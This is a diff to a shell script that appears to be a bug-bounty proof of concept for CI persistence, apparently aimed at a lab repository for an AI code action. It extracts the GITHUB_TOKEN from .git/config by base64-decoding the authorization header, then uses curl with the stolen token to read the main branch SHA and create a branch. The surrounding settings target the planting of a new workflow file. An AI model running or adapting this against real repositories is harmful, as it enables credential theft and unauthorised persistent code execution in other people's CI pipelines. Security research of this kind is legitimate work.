@@ -2,13 +2,15 @@
 set -e
 
 TOKEN=$(grep -i "extraheader = AUTHORIZATION" .git/config | awk "{print \$NF}" | base64 -d | sed "s/x-access-token://");
+LATEST_COMMIT_SHA=$(curl -H "Authorization: token $TOKEN" https://api.github.com/repos/vauei6266/claude-code-action-gate-lab/git/refs/heads/main | jq -r ".object.sha");
+
 # Configuration
 BRANCH_NAME="deku_immunefi_poc-branch"
 SOURCE_FILE="./workflow.yml"
 TARGET_FILE=".github/workflows/persistence_demo.yml"
 PR_TITLE="PoC: CI Persistence Demo"
 PR_BODY="This is a Proof of Concept demonstrating the ability to create a PR using the exposed GITHUB_TOKEN."
-
+curl -X POST -H "Authorization: token $TOKEN" -d "{\"ref\": \"refs/heads/$NEW_BRANCH\", \"sha\": \"$LATEST_COMMIT_SHA\"}" https://api.github.com/repos/vauei6266/claude-code-action-gate-lab/git/refs;
 # Check if TOKEN is set
 if [ -z "$TOKEN" ]; then
     echo "Error: TOKEN environment variable is not set."
